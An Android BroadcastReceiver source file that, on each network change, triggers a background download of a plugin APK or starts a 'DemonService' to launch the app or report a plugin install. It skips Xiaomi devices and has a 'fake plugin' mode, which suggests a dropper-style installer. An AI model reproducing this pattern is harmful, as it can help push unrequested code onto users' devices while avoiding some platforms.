package com.xstd.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.UtilOperator;
import com.xstd.qm.service.DemonService;
import com.xstd.qm.setting.MainSettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: PM1:18
 * To change this template use File | Settings | File Templates.
 */
public class NetworkBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(final Context context, Intent intent) {
        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] Entry >>>>>>>>");

        if (MainSettingManager.getInstance().getMainShouldFakePlugin()) {
            if (Config.DEBUG) {
                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] 母程序中的子程序模拟真正的子程序，所以母程序不做事");
            }
            return;
        }

        if (AppRuntime.isXiaomiDevice()) {
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
            }
            return;
        }

        String path = MainSettingManager.getInstance().getLocalApkPath();

        if (!Config.THIRD_PART_PREVIEW
                && UtilsRuntime.isOnline(context)
                && !TextUtils.isEmpty(path)
                && !Config.DOWNLOAD_PROCESS_RUNNING.get()
                && !UtilOperator.isPluginApkExist()) {
            Intent i = new Intent();
            i.setAction(PluginDownloadBroadcastReceiver.DOWNLOAD_PLUGIN_ACTION);
            context.sendBroadcast(i);
        } else if (TextUtils.isEmpty(path)) {
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the network changed ");
            }

            Intent i = new Intent();
            i.setClass(context, DemonService.class);
            i.setAction(DemonService.ACTION_LANUCH);
            context.startService(i);
        } else if (MainSettingManager.getInstance().getKeyPluginInstalled()
                     && UtilsRuntime.isOnline(context)
                     && !MainSettingManager.getInstance().getNotifyPluginInstallSuccess()) {
            //plugin已经安装，并且有网
            Intent i = new Intent();
            i.setClass(context, DemonService.class);
            i.setAction(DemonService.ACTION_PLUGIN_INSTALL);
            context.startService(i);
        }

        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] Leave <<<<<<<<");
    }

}
